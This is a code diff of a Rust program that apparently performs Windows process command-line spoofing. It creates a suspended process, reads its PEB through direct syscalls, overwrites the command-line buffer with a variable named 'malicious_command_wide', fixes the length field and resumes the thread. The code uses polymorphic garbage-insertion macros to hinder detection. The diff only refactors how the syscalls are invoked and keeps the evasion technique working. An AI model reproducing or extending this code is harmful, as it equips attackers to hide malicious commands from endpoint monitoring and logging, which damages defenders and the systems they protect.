@@ -2,17 +2,27 @@
 use std::mem::{size_of, zeroed};
 use std::ptr::null_mut;
 use rustpolymorphic::polymorph;
-use ntapi::ntpebteb::PEB;
-use ntapi::ntpsapi::PROCESS_BASIC_INFORMATION;
-use rust_syscalls::syscall;
-use winapi::shared::minwindef::{DWORD, LPVOID};
-use winapi::shared::ntdef::{NTSTATUS, UNICODE_STRING};
-use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
-use winapi::um::processthreadsapi::{
-    CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW,
+
+mod syscalls;
+mod windows;
+
+use windows::{
+    CreateProcessW,
+    PEB,
+    PROCESS_BASIC_INFORMATION,
+    PROCESS_INFORMATION,
+    SECURITY_ATTRIBUTES,
+    STARTUPINFOW,
+    UNICODE_STRING,
+    CREATE_NEW_CONSOLE,
+    CREATE_SUSPENDED,
+    DWORD,
+    LPVOID,
+    NTSTATUS,
+    LPCWSTR,
+    LPWSTR,
+    PVOID,
 };
-use winapi::um::winbase::{CREATE_NEW_CONSOLE, CREATE_SUSPENDED};
-use winapi::um::winnt::{LPCWSTR, LPWSTR};
 
 #[polymorph(fn_len = 10, garbage = true)]
 fn to_wide_chars(s: &str) -> Vec<u16> {
@@ -71,8 +81,7 @@ fn main() {
 
     let mut status: NTSTATUS;
     unsafe {
-        status = syscall!(
-            "NtQueryInformationProcess",
+        status = syscalls::NtQueryInformationProcess(
             pi.hProcess,
             0, // ProcessBasicInformation
             &mut pbi as *mut _ as LPVOID,
@@ -83,7 +92,7 @@ fn main() {
 
     if status != 0 {
         println!("NtQueryInformationProcess failed");
-        unsafe { let _ = syscall!("NtClose", pi.hProcess); let _ = syscall!("NtClose", pi.hThread); }
+        unsafe { let _ = syscalls::NtClose(pi.hProcess); let _ = syscalls::NtClose(pi.hThread); }
         return;
     }
 
@@ -91,8 +100,7 @@ fn main() {
     let mut bytes_read: usize = 0;
 
     unsafe {
-        status = syscall!(
-            "NtReadVirtualMemory",
+        status = syscalls::NtReadVirtualMemory(
             pi.hProcess,
             pbi.PebBaseAddress as LPVOID,
             &mut peb as *mut _ as LPVOID,
@@ -103,7 +111,7 @@ fn main() {
 
     if status != 0 || bytes_read != size_of::<PEB>() {
         println!("NtReadVirtualMemory for PEB failed");
-        unsafe { let _ = syscall!("NtClose", pi.hProcess); let _ = syscall!("NtClose", pi.hThread); }
+        unsafe { let _ = syscalls::NtClose(pi.hProcess); let _ = syscalls::NtClose(pi.hThread); }
         return;
     }
 
@@ -114,8 +122,7 @@ fn main() {
     }
     let mut proc_params: Params = unsafe { zeroed() };
     unsafe {
-        status = syscall!(
-            "NtReadVirtualMemory",
+        status = syscalls::NtReadVirtualMemory(
             pi.hProcess,
             peb.ProcessParameters as LPVOID,
             &mut proc_params as *mut _ as LPVOID,
@@ -126,16 +133,15 @@ fn main() {
 
     if status != 0 || bytes_read != size_of::<Params>() {
         println!("NtReadVirtualMemory for ProcessParameters failed");
-        unsafe { let _ = syscall!("NtClose", pi.hProcess); let _ = syscall!("NtClose", pi.hThread); }
+        unsafe { let _ = syscalls::NtClose(pi.hProcess); let _ = syscalls::NtClose(pi.hThread); }
         return;
     }
 
     let mut bytes_written: usize = 0;
     unsafe {
-        status = syscall!(
-            "NtWriteVirtualMemory",
+        status = syscalls::NtWriteVirtualMemory(
             pi.hProcess,
-            proc_params.CommandLine.Buffer,
+            proc_params.CommandLine.Buffer as PVOID,
             malicious_command_wide.as_ptr() as LPVOID,
             malicious_command_wide.len() * 2,
             &mut bytes_written
@@ -144,7 +150,7 @@ fn main() {
 
     if status != 0 {
         println!("NtWriteVirtualMemory for command line failed");
-        unsafe { let _ = syscall!("NtClose", pi.hProcess); let _ = syscall!("NtClose", pi.hThread); }
+        unsafe { let _ = syscalls::NtClose(pi.hProcess); let _ = syscalls::NtClose(pi.hThread); }
         return;
     }
 
@@ -152,8 +158,7 @@ fn main() {
 
     unsafe {
         let len_address = (peb.ProcessParameters as *mut u8).add(0x70);
-        status = syscall!(
-            "NtWriteVirtualMemory",
+        status = syscalls::NtWriteVirtualMemory(
             pi.hProcess,
             len_address as LPVOID,
             &cmd_line_len as *const _ as LPVOID,
@@ -164,14 +169,14 @@ fn main() {
 
     if status != 0 {
         println!("NtWriteVirtualMemory for command line length failed");
-        unsafe { let _ = syscall!("NtClose", pi.hProcess); let _ = syscall!("NtClose", pi.hThread); }
+        unsafe { let _ = syscalls::NtClose(pi.hProcess); let _ = syscalls::NtClose(pi.hThread); }
         return;
     }
 
     unsafe {
         let mut suspend_count: u32 = 0;
-        let _ = syscall!("NtResumeThread", pi.hThread, &mut suspend_count);
-        let _ = syscall!("NtClose", pi.hProcess);
-        let _ = syscall!("NtClose", pi.hThread);
+        let _ = syscalls::NtResumeThread(pi.hThread, &mut suspend_count);
+        let _ = syscalls::NtClose(pi.hProcess);
+        let _ = syscalls::NtClose(pi.hThread);
     }
 }
